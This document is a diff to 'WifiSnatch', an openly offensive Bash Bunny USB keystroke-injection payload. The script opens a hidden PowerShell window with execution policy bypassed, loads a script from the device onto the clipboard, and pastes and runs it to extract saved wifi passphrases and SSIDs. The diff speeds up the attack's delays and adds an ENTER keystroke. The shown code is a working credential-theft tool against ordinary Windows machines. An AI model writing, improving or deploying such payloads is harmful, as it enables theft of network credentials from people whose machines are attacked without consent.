@@ -3,7 +3,7 @@
 # Title:         WifiSnatch
 # Description:   Extract wifi information, such as passphrases & SSIDs
 # Author:        0iphor13
-# Version:       1.0
+# Version:       1.1
 # Category:      Exfiltration
 # Attackmodes:   HID, Storage
 
@@ -20,18 +20,19 @@ ATTACKMODE HID STORAGE
 
 LED STAGE1
 
-DELAY 5000
+Q DELAY 1500
 RUN WIN "powershell -NoP -W hidden -NonI -Exec Bypass"
-DELAY 5000
+Q DELAY 500
+Q ENTER
 
 Q STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\exfil.txt'))"
-DELAY 10000
+Q DELAY 2000
 Q ENTER
-DELAY 10000
+Q DELAY 1000
 Q CONTROL v
-DELAY 10000
+Q DELAY 1000
 Q ENTER
-DELAY 1000
+Q DELAY 1000
 
 LED STAGE2
 
@@ -44,11 +45,11 @@ LED CLEANUP
 
 rm /root/udisk/DONE
 
-DELAY 100
+Q DELAY 100
 
 sync
 
-DELAY 100
+Q DELAY 100
 
 LED FINISH
 
